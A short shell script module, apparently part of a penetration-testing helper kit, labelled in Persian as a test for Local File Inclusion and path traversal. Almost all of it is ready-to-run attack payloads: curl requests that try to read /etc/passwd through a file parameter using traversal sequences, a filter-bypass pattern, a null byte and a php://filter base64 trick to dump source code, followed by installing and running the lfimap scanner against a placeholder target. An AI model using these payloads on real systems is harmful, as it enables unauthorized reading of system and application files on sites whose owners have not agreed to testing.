DESC="تست Local File Inclusion و path traversal"
RISK="HIGH"

termux(){ echo "curl -s 'https://<TARGET>/?file=../../../../etc/passwd'"; }

kali(){
cat <<'EOF'
for p in "../../../../etc/passwd" "....//....//etc/passwd" "/etc/passwd%00" "php://filter/convert.base64-encode/resource=index"; do
  echo "== $p"; curl -s "https://<TARGET>/?file=$p" | head -5
done
# ابزار:
pip install lfimap && lfimap -u "https://<TARGET>/?file=1"
EOF
}
